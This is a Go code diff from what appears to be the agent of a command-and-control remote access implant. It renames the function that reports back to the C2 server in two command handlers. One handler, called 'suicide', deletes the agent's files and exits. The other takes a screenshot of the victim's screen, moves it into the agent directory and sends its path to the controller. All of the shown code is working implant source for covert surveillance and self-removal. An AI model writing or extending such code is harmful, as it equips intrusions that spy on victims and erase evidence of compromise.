@@ -13,13 +13,13 @@ import (
 // suicideCmdRun deletes agent files and exits.
 func suicideCmdRun(cmd *cobra.Command, args []string) {
 	if len(args) != 0 {
-		c2transport.C2RespPrintf(cmd, "args error: %v", args)
+		c2transport.NotifyC2(cmd, "args error: %v", args)
 		return
 	}
 	if err := os.RemoveAll(common.RuntimeConfig.AgentRoot); err != nil {
-		c2transport.C2RespPrintf(cmd, "Failed to cleanup files: %v", err)
+		c2transport.NotifyC2(cmd, "Failed to cleanup files: %v", err)
 	} else {
-		c2transport.C2RespPrintf(cmd, "Cleanup successful, exiting")
+		c2transport.NotifyC2(cmd, "Cleanup successful, exiting")
 	}
 	logging.Println("Exiting...")
 	os.Exit(0)
@@ -29,15 +29,15 @@ func suicideCmdRun(cmd *cobra.Command, args []string) {
 func screenshotCmdRun(cmd *cobra.Command, args []string) {
 	out, err := modules.Screenshot()
 	if err != nil || out == "" {
-		c2transport.C2RespPrintf(cmd, "Error: failed to take screenshot: %v", err)
+		c2transport.NotifyC2(cmd, "Error: failed to take screenshot: %v", err)
 		return
 	}
 	// Move file to agent's root directory.
 	newPath := common.RuntimeConfig.AgentRoot + "/" + out
 	if err := os.Rename(out, newPath); err != nil {
 		logging.Printf("screenshot rename error: %v", err)
-		c2transport.C2RespPrintf(cmd, "screenshot rename error: %v", err)
+		c2transport.NotifyC2(cmd, "screenshot rename error: %v", err)
 		return
 	}
-	c2transport.C2RespPrintf(cmd, "%s", newPath)
+	c2transport.NotifyC2(cmd, "%s", newPath)
 }
